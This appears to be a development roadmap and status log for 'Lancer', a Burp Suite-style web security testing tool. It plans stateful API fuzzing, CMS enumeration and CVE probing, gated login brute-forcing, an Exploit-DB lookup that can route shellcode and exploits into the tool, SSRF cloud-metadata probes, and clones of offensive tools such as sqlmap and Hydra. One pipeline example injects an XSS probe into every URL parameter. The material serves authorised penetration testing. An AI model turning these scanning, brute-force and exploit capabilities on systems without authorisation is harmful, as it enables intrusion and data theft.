Multi-step API request sequences for state-flaw detection (RESTler equivalent). New `lancer-stateful-fuzz` crate. New "Stateful Fuzz" tab in Scanner. API: `POST /v1/stateful-fuzz/start`, `GET /v1/stateful-fuzz/sessions/{id}`.

- [N] Input: OpenAPI/Swagger spec (auto-detected from /openapi.json or user upload) — extracts request grammar + response → param dependencies
- [N] Sequence inference: detect that `POST /users` returns `{id}` that subsequent `GET /users/{id}` needs — auto-chain them
- [N] Stateful fuzzing modes:
  - `production-safe` — read-only (GET) endpoints only
  - `sequence` — every spec'd ordered call sequence
  - `cluster-bomb` — cartesian product of param values across sequence positions
  - `mutate-mid-sequence` — corrupt one mid-sequence value, observe downstream behavior
- [N] State-flaw detectors:
  - **Access-control fault**: created resource accessible by other users after delete
  - **Use-after-free**: resource deleted then read returns 200 instead of 404
  - **Privilege state retention**: role downgrade doesn't strip earlier-grant scope
  - **Workflow skip**: step 2 reachable without step 1 (e.g., `/checkout` without prior `/cart/add`)
- [N] Reuses §17 Session Handling for auth (multi-user pitchfork: User A creates, User B reads)
- [N] Reuses §6 Collaborator for blind state-flaw probes
- [N] CLI: `lancer-cli stateful-fuzz --spec openapi.json --auth-token <token>`
- [N] Output: sequence graphs (PlantUML / Mermaid), found flaws → §19 Findings with full request chain as evidence

## §49 URL Pipeline Toolkit `[N]` ❌

Bundle tiny CLI utilities that everyone uses in recon pipelines (qsreplace / gf / anew / uro / unfurl). Each is <200 LOC. New module `lancer-cli/src/commands/urls.rs` exposing all five as subcommands.

- [N] `lancer-cli url qsreplace <NEW_VALUE>` — replace every query-string value with `<NEW_VALUE>` (e.g., `qsreplace 'lancer'` injects a probe into every param)
- [N] `lancer-cli url gf <PATTERN>` — grep for predefined patterns from `~/.lancer/patterns/` (gf-format pattern files: `xss.json`, `sqli.json`, `ssrf.json`, `redirect.json`, etc.); ship 30+ standard patterns
- [N] `lancer-cli url anew <FILE>` — stream-dedup: print only lines not already in `<FILE>`, append to file
- [N] `lancer-cli url uro` — normalize URLs (remove sessions/tracking params, lowercase host, sort query, trim trailing slash); drops near-duplicate URLs
- [N] `lancer-cli url unfurl <PART>` — extract domain / path / query / scheme / fragment / port from a URL stream
- [N] All five accept stdin, emit stdout — chainable: `cat urls.txt | lancer-cli url uro | lancer-cli url gf xss | lancer-cli url qsreplace '"><svg' | lancer-cli url anew tested.txt`
- [N] Reuses Lancer's URL parser (one codebase) so behavior is consistent with Proxy/Scanner/Intruder
- [N] Each pattern is JSON: `{name, regex, flags, description}` — drop-in compatible with tomnomnom's gf
- [N] Pattern auto-update from a curated GitHub repo (optional, off by default)

## §50 CMS-Aware Scanner `[N]` ❌

WPScan / JoomScan / Drupal-aware Lancer active scanner. Triggers when passive software_disclosure detects a CMS. New `lancer-scanner/src/active/cms/` directory.

- [N] **WordPress** sub-scanner:
  - Detect version from `readme.html`, `meta generator`, `feed?`, `wp-includes/version.php`
  - Enumerate users via `/wp-json/wp/v2/users`, `/?author=<n>` redirect, REST API
  - Enumerate plugins (top 1000 by install count, probed via `/wp-content/plugins/<slug>/`)
  - Enumerate themes
  - Plugin/theme CVE matching from bundled DB (WPScan-feed-compatible)
  - Detect WP-Cron exposure, xmlrpc.php abuse vectors, REST API leaks
  - Check for known weak/default credentials (login bruteforce — gated behind authorization flag)
- [N] **Joomla** sub-scanner:
  - Detect version from `administrator/manifests/files/joomla.xml`, `language/en-GB/en-GB.xml`
  - Component enumeration (com_*), template enumeration
  - Known CVE matching per component+version
  - Detect SQL injections in old com_* extensions (curated DB)
- [N] **Drupal** sub-scanner:
  - Detect version from `CHANGELOG.txt`, `core/CHANGELOG.txt`, `/core/install.php`
  - Module enumeration (top 500), theme enumeration
  - Drupalgeddon family probes (CVE-2018-7600, etc.)
- [N] **Generic CMS** — Magento, Shopify, Wix, Webflow, Ghost, Strapi, Sanity, Contentful — basic version detection + known-issue lookup
- [N] CMS-finding deduplication into §19 Findings with CMS + version + CVE links
- [N] Vuln DB pulled from official WPScan / Joomla / Drupal sources at first run, cached locally (~50 MB)
- [N] CLI: `lancer-cli cms-scan https://target.com`

## §51 Exploit-DB Lookup `[N]` ❌

Right-click any §19 Finding with a CVE → "Show known exploits" — local exploit-db SQLite, offline. searchsploit / getsploit equivalent. New `lancer-exploitdb` crate. API: `GET /v1/exploits/by-cve/{cve}`, `GET /v1/exploits/by-keyword/{q}`.

- [N] Ships with a bundled `exploitdb.sqlite` (downloaded on first run from offensive-security/exploitdb mirror, ~60 MB)
- [N] Index columns: `cve`, `edb_id`, `title`, `author`, `date`, `platform`, `type`, `port`, `path`, `verified`
- [N] Query interface:
  - by CVE: returns all EDB entries citing this CVE
  - by keyword: full-text search across titles + descriptions
  - by software + version: regex-match the bundled "exploits/<plat>/<type>/" tree
- [N] Display panel: each result shows title, date, type (webapps / remote / local / dos / shellcode / papers), severity, link to local exploit code
- [N] Auto-link in §19 Findings: any finding with a CVE auto-shows exploit-db hits inline
- [N] Auto-link in §28 WAF / §5.7 Templates: known-CVE templates surface matching exploits
- [N] Right-click any exploit → "View source" (opens local file) / "Copy as raw" / "Send shellcode to Decoder" / "Send web exploit to Repeater" (parses HTTP-style exploits and pre-fills a Repeater tab)
- [N] Update command: `lancer-cli exploits update` — pulls latest exploit-db diff (~few MB / month)
- [N] CLI: `lancer-cli exploits search "wordpress 5.8"` / `lancer-cli exploits cve CVE-2024-12345`

---

# IMPLEMENTATION STATUS — 2026-06-01 UPDATE

Performance-focused redesign. Lancer's identity is "lighter than Burp and Caido." All features that **run continuously in the background** (consuming RAM / CPU even when the user isn't actively using them) become **opt-in modules** under a new `Settings → Modules` page. When a module is OFF, its code does not execute — no async task is scheduled, no subprocess is spawned, no kernel probe is attached. Toggle ON only what you need.

## §52 Modules System `[N]` ❌

Modular runtime architecture so Lancer starts at **~80MB resident** with all heavy features dormant. User opts in per module from a single GUI page. First-run defaults: **everything OFF**.

### Core trait

```rust
pub trait LancerModule: Send + Sync + 'static {
    fn id(&self) -> &'static str;
    fn name(&self) -> &'static str;
    fn description(&self) -> &'static str;
    fn category(&self) -> ModuleCategory;
    fn estimated_idle_ram_kb(&self) -> u64;
    fn platform_supported(&self) -> bool;          // hide eBPF on non-Linux, JVM if no JRE on PATH
    fn requires_elevation(&self) -> bool;          // eBPF needs sudo/Admin
    async fn start(&self) -> anyhow::Result<ModuleHandle>;
    async fn stop(handle: ModuleHandle) -> anyhow::Result<()>;
    fn live_status(handle: &ModuleHandle) -> ModuleStatus;
}

pub enum ModuleCategory { PluginRuntime, NetworkService, Background, Platform }

pub enum ModuleStatus {
    Off,                                             // not running, zero cost
    Starting,
    Running { pid: Option<u32>, ram_kb: u64, since: Instant },
    Stopping,
    Failed(String),
}
```

A `ModuleRegistry` holds every registered `LancerModule`. The Settings GUI page enumerates the registry, shows status, and toggles via `start()` / `stop()`.

### Three module flavors

**A) In-process task module** (cheapest)
- Toggle ON → `tokio::spawn(task())`, store the `JoinHandle` + `CancellationToken`.
- Toggle OFF → cancel the token; the task exits; memory drops to baseline.
- Used for: **collab, oast-server, scheduler, webhook-notifier**.
- **Idle cost when OFF: literally zero.** The task isn't scheduled. No code runs.

**B) Subprocess module** (heavy runtimes — isolate them from Lancer's address space)
- A separate binary lives next to `lancer.exe` (e.g. `lancer-jvm-host.exe`, `lancer-python-host.exe`, `lancer-wasm-host.exe`).
- Toggle ON → main Lancer spawns the child + sets up IPC (JSON-RPC over stdin/stdout or a local named pipe / UNIX socket).
- Toggle OFF → send `{"method":"shutdown"}`, child exits, **the OS reclaims all the RAM** (libpython3, JVM heap, wasmtime engine — all gone).
- Used for: **jvm, python, wasm**.
- **Idle cost when OFF: zero. The child process literally doesn't exist.**
- **Bonus crash isolation**: if the JVM segfaults or a malicious Python plugin loops forever, Lancer keeps running. Auto-restart configurable.

**C) Privileged daemon module** (eBPF)
- Subprocess + `sudo` prompt on first start.
- Toggle ON → spawn `lancer-ebpf-probe` with elevated permissions; it loads the BPF programs into the kernel.
- Toggle OFF → SIGTERM the probe; kernel detaches every program; **zero kernel overhead**.

### The 7 modules (first batch)

| ID | Name | Category | Flavor | Idle RAM when ON | Idle RAM when OFF |
|----|------|----------|--------|------------------|-------------------|
| `jvm` | JVM plugin host | PluginRuntime | Subprocess | 80-130MB | 0 |
| `python` | Python plugin host | PluginRuntime | Subprocess | 12-20MB | 0 |
| `wasm` | WASM plugin host | PluginRuntime | Subprocess | 6-10MB | 0 |
| `collab` | Live multi-tester sync | NetworkService | In-process | 2-4MB | 0 |
| `oast-server` | Self-hosted Collaborator | NetworkService | In-process | 4-8MB | 0 |
| `scheduler` | Cron / scheduled scans | Background | In-process | 1-2MB | 0 |
| `ebpf` | Kernel-level capture (Linux) | Platform | Privileged daemon | 10-15MB | 0 |

**Sum if everything is ON: ~200MB. Sum if everything is OFF: 0 above Lancer baseline (~80MB).**

### Settings → Modules GUI

A new tab under Settings, single screen:

```
┌─────────────────────────────────────────────────────────────────────────┐
│  Settings ▸ Modules                                                     │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   PLUGIN RUNTIMES                                                       │
│   ───────────────                                                       │
│   ⬜ JVM         Java/Kotlin plugin host       est. 80MB   [Off ▾]   ●  │
│   ⬜ Python      Python plugin host            est. 15MB   [Off ▾]   ●  │
│   ⬜ WASM        WebAssembly plugin host       est.  8MB   [Off ▾]   ●  │
│                                                                         │
│   NETWORK SERVICES                                                      │
│   ────────────────                                                      │
│   ⬜ Collab      Live multi-tester sync        est.  3MB   [Off ▾]   ●  │
│   ⬜ OAST        Self-hosted Collaborator      est.  5MB   [Off ▾]   ●  │
│                                                                         │
│   BACKGROUND                                                            │
│   ──────────                                                            │
│   ⬜ Scheduler   Cron / scheduled scans        est.  1MB   [Off ▾]   ●  │
│                                                                         │
│   PLATFORM  (Linux only — requires root)                                │
│   ───────────────────────────────────────                               │
│   ⬜ eBPF        Kernel-level traffic capture  est. 12MB   [Off ▾]   ●  │
│                                                                         │
│   ─────────────────────────────────────────────────────────────         │
│   Current Lancer resident:   82 MB                                      │
│   Sum if all enabled:       ~204 MB                                     │
│   [Reset all to Off]   [Save snapshot]   [Load snapshot]                │
└─────────────────────────────────────────────────────────────────────────┘
```

- Per-row: checkbox toggle, name, description, estimated RAM, status dropdown (`Off` / `On` / `Auto`), live status dot (●green=running, ●grey=off, ●red=failed).
- Toolbar at bottom: current actual RAM, projected RAM if all on, snapshot save/load (preset module configs — e.g. "Web pentest" / "Mobile pentest" / "Cloud pentest" presets).
- `Auto` mode (per module): enable on first usage attempt, disable after N minutes idle. Smart toggling.
- Crashed modules show a 🔄 retry button and surface stderr in a collapsible panel.

### Persistence

Per-module preference stored in `~/.config/lancer/modules.toml`:

```toml
[modules.jvm]
state = "off"               # off | on | auto

[modules.python]
state = "auto"
auto_idle_timeout_min = 5

[modules.ebpf]
state = "off"
sudo_method = "pkexec"      # pkexec | sudo | doas
```

### CLI parity

```
lancer-cli modules list                        # show every module + status
lancer-cli modules enable <id>                 # turn on (persistent)
lancer-cli modules disable <id>                # turn off (persistent)
lancer-cli modules status                      # live RAM/CPU per running module
lancer-cli modules preset save <name>          # snapshot current toggle states
lancer-cli modules preset load <name>          # restore
```

### API

```
GET    /v1/modules                             # list all registered modules + status
POST   /v1/modules/{id}/start
POST   /v1/modules/{id}/stop
GET    /v1/modules/{id}/status                 # live (RAM kb, CPU %, since)
PUT    /v1/modules/{id}/config                 # per-module config (timeouts, sudo method, etc.)
GET    /v1/modules/presets
POST   /v1/modules/presets/{name}
```

### Subprocess IPC protocol

For runtime-host subprocess modules (JVM/Python/WASM), Lancer talks JSON-RPC 2.0 over the child's stdin/stdout:

```json
→ {"jsonrpc":"2.0","id":1,"method":"hello","params":{"lancer_version":"1.0"}}
← {"jsonrpc":"2.0","id":1,"result":{"runtime":"jvm","version":"21.0.5+11"}}

→ {"jsonrpc":"2.0","id":2,"method":"load_plugin","params":{"path":"/.../foo.jar"}}
← {"jsonrpc":"2.0","id":2,"result":{"plugin_id":"foo","entry":"com.foo.Main"}}

→ {"jsonrpc":"2.0","id":3,"method":"invoke","params":{"plugin":"foo","hook":"onRequest","arg":{"...":"..."}}}
← {"jsonrpc":"2.0","id":3,"result":{"modified":true,"payload":"..."}}

→ {"jsonrpc":"2.0","id":4,"method":"shutdown"}
← (child process exits cleanly)
```

If the child stops answering pings within N seconds → main marks it Failed, optionally auto-restarts based on per-module policy.

### Why this beats the alternatives

- **vs Cargo feature flags**: those need recompile to toggle. Modules toggle live.
- **vs hardcoded "always-on"**: ours uses zero RAM when off. Theirs uses RAM regardless.
- **vs "remove the feature"**: ours keeps the capability one click away; nothing is lost.
- **vs dynamic libraries (dylib)**: subprocess gives crash isolation AND clean OS reclamation; dylib still loads libpython into Lancer's address space.
- **vs Burp's monolithic "everything on by default" approach**: Lancer competes on idle footprint.

### Future modules (room to grow)

The registry pattern allows any feature with significant idle cost to be added later without disturbing the GUI:

- `headless-browser-pool` — pre-warmed Chromium pool for fast `chromiumoxide` ops (saves spawn cost, costs RAM)
- `template-watcher` — background watcher reloading nuclei templates on change
- `crawl-daemon` — continuous passive crawl
- `webhook-notifier` — Discord/Slack push for high-severity findings
- `mobile-adb` — keep `adb-server` alive in background for fast mobile ops

Each one ships with `state = "off"` by default. The user decides what consumes their RAM.

---

# IMPLEMENTATION STATUS — 2026-05-31 (batch-12) — REACHABILITY PASS

A full audit (plan §1–§52 + granular Burp inventory) against the *actual* `crates/` code found that most backends were already implemented but **unreachable** from API/GUI/CLI. This batch closed the reachability gaps. All Rust changes verified with `cargo check` (workspace clean except the pre-existing `lancer-setup` installer build-script, which intentionally requires `LANCER_INSTALLER_ZIP`).

## Closed this batch

- **§4 Intruder — critical fix.** GUI sent payloads as a flat `string[]` while the API expected `Vec<Vec<String>>`, and sent `kind` as `"battering-ram"` while the API matched `"BatteringRam"` — so **every attack 400'd and the GUI fabricated fake results with `Math.random()`**. Fixed the payload shape, made the API accept both shapes + case/separator-insensitive `kind`, and removed the fabrication (real error banner now). `crates/lancer-api/src/main.rs` `intruder()`, `Intruder.svelte`.
- **§5 Scanner** now reachable — `Scanner.svelte` was routed but missing from the nav tabs. Added.
- **§5.2 SSRF** check now iterates the full shared `lancer_tools::cloud_metadata::PROBES` table (AWS IMDSv1/v2, GCP, Azure, DigitalOcean, Oracle, Alibaba) instead of 4 hardcoded probes; added Azure/Alibaba/DO detection regexes.
- **§3 Repeater** — `Send to Sequencer/Comparer/Decoder` + `Copy as fetch/PowerShell` context items now work (were dead stubs); fixed a broken `Send to Intruder` (wrong localStorage key). **§16 Burp AI** buttons (Explain/Investigate/Validate) now POST to `/v1/ai` (BYO-LLM) instead of "Coming soon".
- **§8 Sequencer** GUI/API now uses the real FIPS battery (`lancer_tools::sequencer` — monobit/poker/runs/per-position entropy) instead of inline shannon-only/`Math.random()`.
- **§9 Decoder** — added MD2 / SHA-3-256 / SHA-3-512 (backend-routed via new `POST /v1/transform`, since Web Crypto can't do them) + pretty-print JSON.
- **§19 Reporting** — API `report()` now supports `format=pdf` and `format=tera`, plus `min_severity`/`min_confidence`/`include_fp`/`host`/`summary` query filters + executive summary.
- **§20/§31 Plugins** — `POST /v1/plugins/{id}/toggle`, `DELETE /v1/plugins/{id}` (new `PluginRegistry::remove`), `POST /v1/plugins/upload` now exist (GUI calls were 404ing).
- **§11 Organizer** — `PUT/DELETE /v1/organizer/{id}` (new `OrganizerStore::update`) + GUI tag/notes/title edit, delete, and Send-to-Repeater.
- **§1.2/§12 History annotations** — `PATCH /v1/history/{id}` sets inline comment / highlight color.
- **§18 Project / §33 crash-recovery** — default is now a **temporary in-memory project** (organizer/report/ws-history/annotations work without `--project`); disk projects spawn the auto-snapshot loop; `GET /v1/project`, `POST /v1/project/open`, `POST /v1/project/new-temporary`.
- **§2.4 Engagement tools** — full `/v1/engagement/*` suite (find-comments/scripts/anchors, CSRF PoC, ClickBandit, analyze-target, find-references, search, discover-content) over the existing CLI-only backends.
- **§23 Network settings** — `GET/PUT /v1/proxy/settings` + a new **Network** category in Settings (upstream HTTP/SOCKS proxy, TLS pass-through list, DNS overrides, platform-auth rows).
- **§22 Mobile** — `/v1/mobile/*` (iOS install steps, .mobileconfig profile, Frida SSL-pinning scripts for Android/iOS/Flutter) + new **Mobile** GUI tab.
- **§30 IaC** — `POST /v1/iac/parse` (Dockerfile/compose/k8s/Terraform) + new **IaC** GUI tab.
- **§27/§16 AI** — `POST /v1/ai` (OpenAI/Anthropic/Ollama via `lancer_ai`) + an **AI** Settings category for BYO-LLM provider config.
- **§34/§35 Passive analysis** — the secret scanner + JS miner now run automatically on **every proxy response** (consumes the proxy `ResponseCaptured` event stream; correlates URLs via `RequestCaptured`; dedups).
- **§52 Modules** — per-module state now persists to `~/.lancer/modules.toml` (load on startup, `POST /v1/modules/{id}/set-state`).
- **CLI parity (§40/§42/§43/§44/§45/§47/§48/§50/§51/§52)** — added 10 subcommands: `ysoserial`, `llm-scan`, `llm-redteam`, `mcp-scan`, `shadow`, `stateful-fuzz`, `cms-scan`, `exploits`, `shodan`, `modules`.
- **Settings** also gained **Display** (theme/font-size) and **Updates** (version check) pages.

## Knowingly NOT done (genuinely large / net-new infrastructure)

These need substantial new systems, not wiring, and remain open:
- **§6 Collaborator / OOB server** — ✅ DONE in batch-13 (`lancer-oast` crate: DNS/HTTP/SMTP listeners + correlation engine + GUI tab). Remaining polish: auto-correlate scanner-emitted payloads, RSA-encrypted callbacks, hosted public tier.
- **§13 Embedded Chromium browser** + **§7 DOM Invader runtime** + **§5.1.1 deep JS-render crawler** — require headless Chromium / a browser extension. "Open Browser" still shells out to system Chrome.
- **§4.6 Mass Fuzz + `lancer-fuzz` binary** and the remaining Intruder payload-set/processor variants — net-new high-speed engine.
- **§1.3 WebSocket frame capture** — the listener still tunnels WS without decoding into `WsStore` (table stays empty).
- **§23 NTLM/Negotiate** platform auth — still placeholder handshakes; **§25** 100k-req/s benchmark suite, **§26** live-collab cursor sync, **§29** eBPF BPF object, and **§17 Session Rules/Macros GUI** are not built.
- **Data corpora** (200+/800+ secret patterns, 120+ LLM probes, 10k routes, 200+ gadget classes, real ysoserial/exploit-db datasets) remain below the aspirational plan counts.

---

## The 30-Tool Separate Clone Set

All 30 are at `./19/<toolname>/plan.md` (folder name kept as `19/` for backwards compat). Each is a standalone project — Rust where practical, Go where the original is Go, Python where the domain demands it (symbolic execution, ML).

| # | Tool | Domain | Folder |
|---|---|---|---|
| 1 | subfinder | Subdomain enumeration | `19/subfinder/` |
| 2 | naabu | Port scanning | `19/naabu/` |
| 3 | dnsx | DNS toolkit | `19/dnsx/` |
| 4 | cdncheck | CDN detection | `19/cdncheck/` |
| 5 | gau | Historical URL extraction | `19/gau/` |
| 6 | Foundry | Smart contract framework | `19/foundry/` |
| 7 | Aderyn | Smart contract static analysis | `19/aderyn/` |
| 8 | Medusa | Smart contract fuzzer | `19/medusa/` |
| 9 | Halmos | Smart contract formal verification | `19/halmos/` |
| 10 | Prowler | Cloud audit | `19/prowler/` |
| 11 | Pacu | AWS exploitation | `19/pacu/` |
| 12 | CloudFox | Cloud attack paths | `19/cloudfox/` |
| 13 | Stratus Red Team | Cloud adversary emulation | `19/stratus-red-team/` |
| 14 | kube-hunter | Kubernetes pentest | `19/kube-hunter/` |
| 15 | MobSF | Mobile static + dynamic | `19/mobsf/` |
| 16 | Frida | Runtime instrumentation | `19/frida/` |
| 17 | Ghidra | Binary decompiler | `19/ghidra/` |
| 18 | Promptfoo | LLM red teaming | `19/promptfoo/` |
| 19 | Strix | Autonomous AI hackbot | `19/strix/` |
| 20 | jadx | Android APK → Java/Kotlin decompiler | `19/jadx/` |
| 21 | APKTool | APK decode/rebuild/smali toolchain | `19/apktool/` |
| 22 | Slither | Solidity static analysis (industry-standard) | `19/slither/` |
| 23 | Nmap | Port + service + NSE scripting (beyond naabu) | `19/nmap/` |
| 24 | Wireshark | L2/L3 packet capture + protocol dissection | `19/wireshark/` |
| 25 | SpiderFoot | OSINT automation framework (200+ modules) | `19/spiderfoot/` |
| 26 | sqlmap | SQL injection exploitation / DB takeover | `19/sqlmap/` |
| 27 | Hydra | Network login brute-force (SSH/FTP/SMB/POP3/etc.) | `19/hydra/` |
| 28 | Semgrep | General-language SAST (rules across 30+ langs) | `19/semgrep/` |
| 29 | Agentic Radar | Agentic AI workflow security scanner | `19/agentic-radar/` |
| 30 | ModelScan | ML model file (pickle/H5) supply-chain scanner | `19/modelscan/` |

Together, Lancer + the 30 clones = a complete 2026 AI-era bug bounty workstation, all built by you with Claude Code.

## EVERY TINY BURP FEATURE — granular inventory (2026-05-24)

Pass made against open Burp Suite Community 2026.4.3 with embedded Chromium open. Per area, every checkbox / dropdown / context-menu item / hotkey enumerated. Status: `□` = not implemented; `■` = done; `▣` = partial.

### Proxy → Intercept toolbar
- □ Action button drop-down (Burp: Send to Spider/Scanner/Intruder/Repeater/Sequencer/Decoder/Comparer/Save item/Don't intercept requests like this/Do intercept/Convert request method/Change body encoding/Copy URL/Copy as curl/PowerShell/fetch/Paste URL as new request)
- ■ Forward
- ■ Drop
- ■ Intercept on/off toggle
- □ Forward all (currently disabled — needs queue drain)
- ▣ Open Browser button — currently launches system Chrome (needs embedded Chromium)

### Proxy → HTTP history
- ■ Columns: #/Host/Method/URL/Status/Length/MIME/Time(ms)
- □ Columns: Params / Edited / Extension / Title / Comment / TLS / IP / Cookies / Listener
- □ Row coloring (7 highlight colors)
- □ Comment editing inline
- □ Bambda filter mode
- □ Custom columns via Bambda
- ■ Filter input (host/path/status/method)
- □ Filter by MIME type group (script/image/CSS/binary/Flash/text)
- □ Filter by extension
- □ Filter by listener
- □ Filter "show only in-scope"
- □ Filter "show only parametrized"
- □ Filter "show only with comments"
- □ Hide 4xx / 5xx range
- □ Show only requested (vs inferred) items
- □ Right-click context menu items (all): Send to Spider / Scanner / Intruder / Repeater / Sequencer / Decoder / Comparer / Save item / Show response in browser / Request in browser (current session / original session) / Add to scope / Engagement tools sub-menu (Find references, Find comments, Find scripts, Generate CSRF PoC, ClickBandit, Discover content, Schedule task, Simulate manual testing, Target analyzer) / Copy URL / Copy as curl / Copy as PowerShell / Copy as fetch / Copy links in selected items / Save entire history / View

### Proxy → WebSockets history
- □ Table populated from `lancer-storage/websocket.rs`
- □ Direction column (client→server / server→client)
- □ Type column (text / binary / close / ping / pong)
- □ Length column
- □ Filter by direction / type / host
- □ Right-click Send to Repeater (WS mode)
- □ Right-click Send to Comparer

### Proxy → Match and replace
- ■ Rule list table
- ■ Per-rule enable/disable toggle
- ■ Add new rule (basic dialog)
- □ Target dropdown: Request header / Request body / Request first line / Response header / Response body / Response first line / Request param name / Request param value / Request cookie name / Request cookie value
- □ Comment field per rule
- □ Case sensitive toggle
- ■ Regex toggle
- □ Re-order (Up/Down) rules
- □ Import / export rule set as JSON

### Proxy → Proxy settings (Burp puts this in Settings now)
- ▣ Listeners list (Lancer has just one bind addr field — no multi-listener UI)
- □ Per-listener: Bind to all interfaces / loopback only / specific interface
- □ Per-listener: Request handling sub-config (force TLS, redirect host, redirect port, invisible proxy support, TLS protocols list)
- □ Per-listener: Certificate (self-signed per host / specific cert / generate CA-signed)
- □ Intercept client requests rule list (URL/method/params/cookies/header/body match, default action, auto match-and-replace)
- □ Intercept server responses rule list
- □ Response modification rule set: unhide hidden form fields / highlight unhidden fields / enable disabled form fields / remove input length limits / remove JS form validation / remove all JavaScript / remove all object tags / HTTPS→HTTP / strip Secure cookie flag
- □ TLS pass through host list (UI)
- □ Misc: Use HTTP/2 / Default to HTTP/2 in upstream / Auto update Content-Length / Always unpack gzip-deflate / Strip Proxy-* / Strip Sec-WebSocket-Extensions / Set response body encoding to original / Suppress error messages in browser / Disable logging to history and site map

### Target → Site map
- ▣ Tree (host → path) — present, but no port grouping, no method indicator per branch, no severity circle
- □ Black/gray text distinction (requested vs inferred)
- □ Hide MIME-types filter row
- □ "Show only in-scope" toggle
- □ "Show only parametrized" toggle
- □ Hide 4xx/5xx checkbox
- □ Filter by annotations
- □ Right-click on tree node: Spider this branch / Actively scan / Add to scope / Remove from scope / Add comment / Set highlight color / Copy URLs in this branch / Copy links in branch / Save selected items / Engagement tools / Compare site maps / Expand requested items / Expand branch / Collapse all
- □ Bottom Issues panel per-host
- □ Compare site maps (Pro)

### Target → Scope
- □ Include in scope: protocol / host / port / file pattern, regex toggle
- □ Exclude from scope (same fields)
- □ "Use advanced control (regex)" toggle
- □ Right-click paste URL as new rule
- □ Import / export scope JSON
- □ "Use scope" suite-wide toggle

### Target → Issue definitions
- □ Static catalog of all issue types with severity, description, remediation templates (independent from observed findings)

### Intruder → Positions
- ▣ Attack type radios (Sniper/BatteringRam/Pitchfork/ClusterBomb)
- ▣ Request template textarea (raw)
- □ Auto § button (auto-mark every param)
- □ Clear § button
- □ Add § button (toggle at cursor)
- □ Refresh button (reload original request)
- □ Update Content-Length checkbox
- □ Use HTTP/2 checkbox

### Intruder → Payloads
- ▣ Per-set "Simple list" textarea
- □ Per-set numbered selector (1..N) with dropdown of payload TYPE
- □ Payload type: Runtime file (stream from disk)
- □ Payload type: Custom iterator (multi-position cartesian)
- □ Payload type: Character substitution (rules table)
- □ Payload type: Case modification (lower/upper/property/inverse-property/inverse-case)
- □ Payload type: Recursive grep (chained from previous response)
- □ Payload type: Illegal Unicode (base + max bytes)
- □ Payload type: Character blocks (min/max/step)
- □ Payload type: Numbers (sequential/random, from/to/step, format, base, min/max digits)
- □ Payload type: Dates (format, from/to/step, skip weekends)
- □ Payload type: Brute forcer (charset + min/max length)
- □ Payload type: Null payloads (count — for race conditions)
- □ Payload type: Character frobber
- □ Payload type: Bit flipper (original, format, positions)
- □ Payload type: Username generator (first/last name lists)
- □ Payload type: ECB block shuffler
- □ Payload type: Add from list (XSS / SQLi / fuzz strings / directories / extensions / etc. built-in)
- □ Payload type: Extension-generated
- □ Payload processing rules table (chained):
  - □ Add prefix / Add suffix
  - □ Match/replace (regex)
  - □ Substring (offset, length)
  - □ Reverse substring
  - □ Modify case (lower/upper/property)
  - □ Encode (URL/HTML/Base64/ASCII hex/hex/octal/binary/gzip)
  - □ Decode (same)
  - □ Hash (MD2/MD5/SHA-1/SHA-256/SHA-384/SHA-512/SHA-3-224/256/384/512)
  - □ Add raw payload (after processing)
  - □ Skip if matches regex
  - □ Invoke extension processor
  - □ Per-rule on/off toggle
- □ Payload encoding section: URL-encode these characters (default `;&+`)

### Intruder → Resource pool
- □ New / existing pool selector
- □ Max concurrent requests
- □ Delay between requests (fixed / random range)
- □ Pause on network errors

### Intruder → Settings
- □ Number of threads
- □ Network failure retries
- □ Pause on errors
- □ Store requests / Store responses toggles
- □ Make baseline (unmodified) request
- □ Denial-of-service mode (no response wait)
- □ Store full payloads toggle
- □ Grep — match: string list (mark response if contained)
- □ Grep — extract: regex/start-end boundary table, case sensitive, in headers/body/anywhere, max captures
- □ Grep — payloads: case sensitive, in headers/body
- □ Redirections: Never / On-site only / In-scope only / Always; max redirect count
- □ Custom request engine settings

### Intruder → Results
- ▣ Columns: Request # / Position 1 payload / Status / Length / Time / payload reflected
- □ Columns: Position 2..N payload (multi-position attacks)
- □ Columns: Error / Timeout / Comment / Timestamp / Time received / Response time
- □ Per grep-match: column appears (✓/blank)
- □ Per grep-extract: column appears (captured value)
- □ Sort by column
- □ Filter results
- □ Save attack (XML / .lancer)
- □ Load attack
- □ Compare requests (send 2 selected to Comparer)
- □ Action menu: Save results table CSV / Save responses

### Repeater
- ▣ Tabs with × close
- ▣ + new tab
- □ Rename tab (F2)
- □ Color tab
- □ Group tabs
- □ Duplicate tab
- ▣ Send button (Ctrl+R)
- ▣ Cancel
- ▣ History prev/next
- □ Send group (parallel / sequential)
- □ Update Content-Length checkbox
- □ Update Cookies from cookie jar checkbox
- □ Follow redirects toggle + max count
- □ HTTP/1 ↔ HTTP/2 selector
- □ WebSocket mode for WS targets
- ▣ Request: Pretty / Raw / Hex
- ■ Response: Pretty / Raw / Hex / Render (added in this commit batch)
- ▣ Inspector: only "Attribs" sub-tab present
- □ Inspector: URL params editable rows
- □ Inspector: Body params editable rows
- □ Inspector: Cookies editable rows
- □ Inspector: Headers editable rows
- ■ Right-click: Send to Intruder / Sequencer / Comparer / Decoder (batch-12)
- ■ Right-click: Copy as curl / fetch / PowerShell (batch-12)
- ■ Right-click: Convert request method (GET↔POST)
- □ Right-click: Change body encoding
- ■ AI button — Explain / Investigate / Validate via /v1/ai (batch-12)

### Sequencer → Live capture
- □ Select request from history/site map (not pasted)
- □ Token location: response cookie name / response header name / URL parameter / form field / start-end boundary in body
- □ Start / Stop / Pause live capture
- □ Throttle / Threads
- □ Ignore token timeout
- □ Sample count target

### Sequencer → Analysis
- ■ Overall reliability + bit entropy stat — batch-12 wired to real `lancer-tools/sequencer` FIPS battery via `/v1/sequencer/analyse` (monobit/poker/runs/per-position entropy)
- □ Effective entropy at 95% / 99% confidence
- □ Char-level analysis table
- □ Bit-level analysis table
- □ FIPS Monobit / Poker / Runs / Long Runs / Spectral / Correlation / Compression tests
- □ Per-position character / bit results
- □ Save / reload token sample

### Decoder
- ■ Base64 / URL / HTML encode + decode
- ■ Hex / ASCII hex / Octal / Binary encode + decode (added this commit)
- ■ GZIP encode + decode (added this commit)
- ■ Hash: MD5 / SHA-1 / SHA-256 / SHA-384 / SHA-512 (added this commit)
- ▣ Hash: MD2 / SHA-3-256 / SHA-3-512 (batch-12 — backend-routed via /v1/transform). SHA-3-224 / SHA-3-384 still missing
- ■ Smart decode
- ■ Chain rows
- □ Text ↔ Hex view toggle per row (Burp lets you switch input mode)
- □ Pretty-print JSON / XML

### Comparer
- ■ Words / Bytes mode
- ■ Stats: same / added / removed
